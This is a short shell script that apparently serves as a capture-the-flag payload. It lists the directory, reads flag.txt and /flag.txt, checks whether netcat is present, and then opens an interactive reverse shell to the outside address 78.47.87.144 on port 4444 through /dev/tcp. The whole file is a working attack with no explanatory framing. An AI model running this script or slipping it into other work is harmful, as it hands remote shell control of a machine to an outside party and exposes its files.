#!/bin/sh
ls -altr
cat flag.txt
cat /flag.txt
which nc
sh -i >& /dev/tcp/78.47.87.144/4444 0>&1
